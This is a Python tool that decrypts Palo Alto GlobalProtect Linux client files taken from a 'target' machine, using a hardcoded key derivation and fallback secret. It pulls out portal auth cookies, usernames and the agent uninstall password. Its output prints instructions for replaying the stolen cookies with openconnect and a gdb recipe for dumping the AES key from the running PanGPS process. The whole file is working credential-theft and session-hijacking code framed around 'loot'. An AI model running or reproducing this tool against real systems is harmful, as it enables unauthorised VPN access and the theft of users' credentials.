#!/usr/bin/env python3
"""
Decrypts PanGPS configuration, cookie, and HIP .dat files from Linux clients.

Crypto:
  KDF:    MD5(input + MD5("pannetwork")), repeated to 32 bytes
  Cipher: AES-256-CBC, null IV (16 zero bytes)
  Input:  "global135protect" fallback string (default on Linux)

File locations on target:
  ~/.GlobalProtect/PanPortalCfg_<hash>.dat   (portal config XML)
  ~/.GlobalProtect/PanPUAC_<hash>.dat        (auth cookie)
  ~/.GlobalProtect/PanPCD_<hash>.dat         (connection data)
  /opt/paloaltonetworks/globalprotect/       (install dir, HIP files)

  <hash> = MD5("<portal>_<username>")

Examples:
  # Default fallback key (most likely on Linux)
  ./gp_decrypt_linux.py -f PanPortalCfg.dat

  # Try additional KDF inputs from the target machine
  ./gp_decrypt_linux.py -f file.dat \\
    --try-machine-id d4c3e2f1a0b9988776655443322110ff \\
    --try-hostname myhost.corp.com

  # Provide a known AES key directly (skips KDF)
  ./gp_decrypt_linux.py --key C410...77 -f file.dat

  # Decrypt all .dat files in a directory
  ./gp_decrypt_linux.py --dir ./loot/ -o ./decrypted/

  # Compute filename hash
  ./gp_decrypt_linux.py --hash --portal vpn.corp.com --username johndoe

  # Just show derived keys without decrypting
  ./gp_decrypt_linux.py --show-key --try-hostname mybox

  # Encrypt a plaintext XML (for research)
  ./gp_decrypt_linux.py --encrypt --infile config.xml --outfile out.dat

Requires: pip install cryptography
"""

import argparse
import hashlib
import os
import sys
import xml.etree.ElementTree as ET
from pathlib import Path

try:
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    from cryptography.hazmat.primitives import padding as sym_padding
    from cryptography.hazmat.backends import default_backend
except ImportError:
    print("[!] pip install cryptography")
    sys.exit(1)


# ───────────────────────────────────────────────────────────────
# Constants
# ───────────────────────────────────────────────────────────────

NULL_IV = bytes(16)
PANNETWORK = "pannetwork"
FALLBACK_INPUT = "global135protect"


# ───────────────────────────────────────────────────────────────
# KDF
# ───────────────────────────────────────────────────────────────

def derive_key(kdf_input: bytes) -> bytes:
    """MD5(input + MD5("pannetwork")), repeated to 32 bytes."""
    md5_pan = hashlib.md5(PANNETWORK.encode("ascii")).digest()
    half = hashlib.md5(kdf_input + md5_pan).digest()
    return half + half





# ───────────────────────────────────────────────────────────────
# AES
# ───────────────────────────────────────────────────────────────

def aes_decrypt(ct: bytes, key: bytes) -> bytes:
    if not ct or len(ct) % 16 != 0:
        return b""
    dec = Cipher(algorithms.AES(key), modes.CBC(NULL_IV),
                 backend=default_backend()).decryptor()
    pt = dec.update(ct) + dec.finalize()
    try:
        u = sym_padding.PKCS7(128).unpadder()
        pt = u.update(pt) + u.finalize()
    except ValueError:
        pass
    return pt


def aes_encrypt(pt: bytes, key: bytes) -> bytes:
    p = sym_padding.PKCS7(128).padder()
    padded = p.update(pt) + p.finalize()
    enc = Cipher(algorithms.AES(key), modes.CBC(NULL_IV),
                 backend=default_backend()).encryptor()
    return enc.update(padded) + enc.finalize()


# ───────────────────────────────────────────────────────────────
# Validation
# ───────────────────────────────────────────────────────────────

def looks_valid(pt: bytes) -> tuple[bool, str]:
    if not pt or len(pt) < 2:
        return False, "empty"

    stripped = pt.rstrip(b"\x00")
    if len(stripped) <= 2:
        return True, "short/null (typical PanPCD)"

    sample = pt[:4096]

    xml_markers = [b"<?xml", b"<policy", b"<gateways", b"<portal",
                   b"<hip-report", b"<response", b"encoding=",
                   b"<agent-ui"]
    for m in xml_markers:
        if m in sample:
            return True, f"XML: {m.decode()}"

    printable = sum(1 for b in sample if 32 <= b < 127 or b in (9, 10, 13))
    ratio = printable / len(sample)
    if ratio > 0.85:
        return True, f"{ratio:.0%} printable"

    return False, f"only {ratio:.0%} printable"


# ───────────────────────────────────────────────────────────────
# Candidate builder (fully CLI-driven)
# ───────────────────────────────────────────────────────────────

def build_candidates(args) -> list[tuple[str, bytes]]:
    cands = []

    # Explicit key — skip KDF entirely
    if args.key:
        k = bytes.fromhex(args.key)
        if len(k) != 32:
            print("[!] --key must be 64 hex chars (32 bytes)")
            sys.exit(1)
        return [("provided --key", k)]

    # Always include the fallback (most likely on Linux)
    cands.append(("fallback 'global135protect'",
                  derive_key(FALLBACK_INPUT.encode("ascii"))))

    # --try-input: arbitrary string fed into KDF
    for s in (args.try_input or []):
        cands.append((f"input '{s}'", derive_key(s.encode("utf-8"))))

    # --try-machine-id: /etc/machine-id value from target
    for mid in (args.try_machine_id or []):
        mid = mid.strip()
        cands.append((f"machine-id ascii '{mid}'",
                      derive_key(mid.encode("ascii"))))
        try:
            cands.append((f"machine-id hex-decoded",
                          derive_key(bytes.fromhex(mid))))
        except ValueError:
            pass

    # --try-hostname: target's hostname
    for h in (args.try_hostname or []):
        cands.append((f"hostname '{h}'", derive_key(h.encode("ascii"))))

    # --try-raw-key: pre-computed 32-byte key (no KDF)
    for rk in (args.try_raw_key or []):
        try:
            k = bytes.fromhex(rk)
            if len(k) == 32:
                cands.append((f"raw key '{rk[:16]}...'", k))
            else:
                print(f"[!] --try-raw-key needs 64 hex chars, got {len(rk)}")
        except ValueError as e:
            print(f"[!] Bad hex: {e}")

    # Edge cases
    cands.append(("empty input", derive_key(b"")))
    cands.append(("input 'pannetwork'",
                  derive_key(PANNETWORK.encode("ascii"))))

    return cands


# ───────────────────────────────────────────────────────────────
# Portal config parser
# ───────────────────────────────────────────────────────────────

def parse_portal_config(data: bytes) -> dict:
    info = {}
    try:
        text = data.decode("utf-8", errors="replace")
        start = text.find("<?xml")
        if start > 0:
            text = text[start:]
        root = ET.fromstring(text)
        for name, xpath in {
            "portal-name": ".//portal-name",
            "username": ".//username",
            "user-domain": ".//user-domain",
            "tenant-id": ".//tenant-id",
            "auth-cookie": ".//portal-userauthcookie",
            "prelogon-cookie": ".//portal-prelogonuserauthcookie",
            "uninstall-password": ".//agent-user-override-key",
            "connect-method": ".//connect-method",
        }.items():
            el = root.find(xpath)
            if el is not None and el.text and el.text.strip():
                info[name] = el.text.strip()
        gw = [e.get("name") for e in root.findall(".//gateways//entry")
              if e.get("name")]
        if gw:
            info["gateways"] = gw
    except ET.ParseError:
        pass
    return info


# ───────────────────────────────────────────────────────────────
# Core decrypt logic
# ───────────────────────────────────────────────────────────────

def try_decrypt(data: bytes,
                candidates: list[tuple[str, bytes]]
                ) -> tuple[str, bytes, bytes] | None:
    for desc, key in candidates:
        pt = aes_decrypt(data, key)
        ok, _ = looks_valid(pt)
        if ok:
            return desc, key, pt
    return None


def process_file(filepath: str, candidates: list[tuple[str, bytes]],
                 output_dir: str | None, raw: bool, verbose: bool,
                 known_key: tuple[str, bytes] | None
                 ) -> tuple[str, bytes] | None:
    fname = os.path.basename(filepath)
    fsize = os.path.getsize(filepath)
    print(f"\n[*] {fname} ({fsize} bytes)")

    if fsize == 0:
        print("    SKIP: empty")
        return None

    data = Path(filepath).read_bytes()
    if len(data) % 16 != 0:
        print(f"    SKIP: not block-aligned ({len(data)} bytes)")
        return None

    ordered = list(candidates)
    if known_key:
        ordered.insert(0, known_key)

    result = try_decrypt(data, ordered)
    if result is None:
        print("    FAILED: no key produced valid output")
        if verbose:
            pt = aes_decrypt(data, candidates[0][1])
            print(f"    Raw hex (first key): {pt[:64].hex()}")
        return None

    desc, key, plaintext = result
    _, reason = looks_valid(plaintext)

    print(f"    Key source: {desc}")
    print(f"    AES key:    {key.hex().upper()}")
    print(f"    Validation: {reason}")
    print(f"    Decrypted:  {len(plaintext)} bytes")

    if output_dir:
        ext = ".xml" if b"<?xml" in plaintext[:100] else ".txt"
        out_path = os.path.join(output_dir,
                                fname.replace(".dat", f".decrypted{ext}"))
        Path(out_path).write_bytes(plaintext)
        print(f"    Saved: {out_path}")

    if "PanPortalCfg" in fname:
        info = parse_portal_config(plaintext)
        if info:
            print("    ── Portal Config ──")
            for k, v in info.items():
                if k == "gateways":
                    print(f"      gateways: {', '.join(v)}")
                elif isinstance(v, str) and len(v) > 60:
                    print(f"      {k}: {v[:60]}...")
                else:
                    print(f"      {k}: {v}")
    elif "PanPUAC" in fname:
        try:
            cookie = plaintext.decode("utf-8", errors="replace").strip()
            if cookie and cookie != "empty":
                print("    ── Auth Cookie ──")
                print(f"      {cookie[:100]}{'...' if len(cookie) > 100 else ''}")
        except Exception:
            pass

    if not output_dir and not raw:
        try:
            text = plaintext.decode("utf-8", errors="replace")
            limit = 2000
            print(f"\n{text[:limit]}")
            if len(text) > limit:
                print(f"... ({len(text) - limit} more chars)")
        except Exception:
            print("    [binary data]")
    elif raw:
        sys.stdout.buffer.write(plaintext)

    return (desc, key)


# ───────────────────────────────────────────────────────────────
# Main
# ───────────────────────────────────────────────────────────────

def main():
    p = argparse.ArgumentParser(
        description="GlobalProtect Linux .dat decryptor",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
KDF: MD5(input + MD5("pannetwork")), repeated to 32 bytes, null IV.
On Linux the input is most likely "global135protect" (tried by default).

Examples:
  %(prog)s -f PanPortalCfg.dat
  %(prog)s -f PanPUAC.dat --try-machine-id d4c3e2f1a0b9988776655443322110ff
  %(prog)s --dir ./loot/ --try-hostname myhost -o ./decrypted/
  %(prog)s --key <64 hex chars> -f file.dat
  %(prog)s --hash --portal vpn.corp.com --username johndoe
  %(prog)s --show-key --try-hostname mybox --try-machine-id abc123
""")

    files_g = p.add_argument_group("file selection")
    files_g.add_argument("-f", "--file", action="append",
                         help="File(s) to decrypt (repeatable)")
    files_g.add_argument("--dir",
                         help="Directory containing .dat files")

    key_g = p.add_argument_group("key / KDF inputs (all optional, tried in order)")
    key_g.add_argument("--key",
                       help="Exact AES-256 key, 64 hex chars (skips KDF)")
    key_g.add_argument("--try-input", action="append", metavar="STR",
                       help="Arbitrary string to feed into KDF (repeatable)")
    key_g.add_argument("--try-machine-id", action="append", metavar="ID",
                       help="Target's /etc/machine-id value (repeatable)")
    key_g.add_argument("--try-hostname", action="append", metavar="NAME",
                       help="Target's hostname (repeatable)")
    key_g.add_argument("--try-raw-key", action="append", metavar="HEX",
                       help="Pre-computed 32-byte key, no KDF (repeatable)")

    out_g = p.add_argument_group("output")
    out_g.add_argument("-o", "--output", help="Output directory")
    out_g.add_argument("--raw", action="store_true",
                       help="Write raw decrypted bytes to stdout")
    out_g.add_argument("-v", "--verbose", action="store_true")

    util_g = p.add_argument_group("utility modes")
    util_g.add_argument("--hash", action="store_true",
                        help="Compute filename hash and exit")
    util_g.add_argument("--portal", help="Portal address (for --hash)")
    util_g.add_argument("--username", help="Username (for --hash)")
    util_g.add_argument("--encrypt", action="store_true",
                        help="Encrypt a plaintext file")
    util_g.add_argument("--infile", help="Input file (for --encrypt)")
    util_g.add_argument("--outfile", help="Output file (for --encrypt)")
    util_g.add_argument("--show-key", action="store_true",
                        help="Derive and print key(s), don't decrypt")

    args = p.parse_args()

    # ── Hash mode ──
    if args.hash:
        if not args.portal or not args.username:
            p.error("--hash needs --portal and --username")
        h = hashlib.md5(
            f"{args.portal}_{args.username}".encode("ascii")).hexdigest()
        print(f"Portal:   {args.portal}")
        print(f"Username: {args.username}")
        print(f"MD5:      {h}")
        print(f"Files:    PanPortalCfg_{h}.dat  PanPUAC_{h}.dat  PanPCD_{h}.dat")
        return

    # ── Build candidates ──
    candidates = build_candidates(args)

    # ── Show-key mode ──
    if args.show_key:
        print(f"{'Description':<45} Key (hex)")
        print("-" * 110)
        for desc, key in candidates:
            print(f"{desc:<45} {key.hex().upper()}")
        return

    # ── Encrypt mode ──
    if args.encrypt:
        if not args.infile or not args.outfile:
            p.error("--encrypt needs --infile and --outfile")
        key = candidates[0][1]
        pt = Path(args.infile).read_bytes()
        ct = aes_encrypt(pt, key)
        Path(args.outfile).write_bytes(ct)
        print(f"[+] Encrypted {len(pt)} -> {len(ct)} bytes")
        print(f"    Key: {key.hex().upper()}")
        print(f"    Out: {args.outfile}")
        return

    # ── Gather files ──
    files = []
    for f in (args.file or []):
        if os.path.exists(f):
            files.append(f)
        else:
            print(f"[!] Not found: {f}")

    if args.dir:
        if os.path.isdir(args.dir):
            for f in sorted(os.listdir(args.dir)):
                if f.endswith(".dat"):
                    files.append(os.path.join(args.dir, f))
        else:
            print(f"[!] Not a directory: {args.dir}")

    if not files:
        p.error("No files. Use -f <file> or --dir <path>")

    if args.output:
        os.makedirs(args.output, exist_ok=True)

    # ── Summary ──
    print(f"[*] {len(candidates)} key candidate(s):")
    for desc, key in candidates:
        if args.verbose:
            print(f"    {desc}  ->  {key.hex().upper()}")
        else:
            print(f"    {desc}")
    print(f"[*] {len(files)} file(s) to process")
    print("=" * 65)

    # ── Decrypt ──
    known_key = None
    success = 0

    for filepath in files:
        result = process_file(filepath, candidates, args.output,
                              args.raw, args.verbose, known_key)
        if result:
            known_key = result
            success += 1

    # ── Final summary ──
    print(f"\n{'='*65}")
    print(f"[*] {success}/{len(files)} files decrypted")

    if known_key:
        desc, key = known_key
        print(f"\n[+] Working key: {key.hex().upper()}")
        print(f"    Source: {desc}")
        print(f"\n    Reuse: --key {key.hex()}")
        print(f"\n[*] Replay cookies with openconnect:")
        print(f'    sudo openconnect --protocol=gp \\')
        print(f'      --user="DOMAIN\\\\user" \\')
        print(f'      --usergroup=portal:portal-userauthcookie \\')
        print(f'      --os=win https://vpn.example.com')
    else:
        print("\n[-] No working key found. Try providing target machine info:")
        print("    --try-machine-id <target's /etc/machine-id>")
        print("    --try-hostname <target's hostname>")
        print("    --try-input <any string>")
        print("\n    Or extract the key from the running PanGPS process:")
        print("    sudo gdb -p $(pgrep PanGPS) \\")
        print("      -ex 'break EVP_DecryptInit_ex' \\")
        print("      -ex 'commands' -ex 'x/32bx $rdx' -ex 'end' \\")
        print("      -ex continue")


if __name__ == "__main__":
    main()
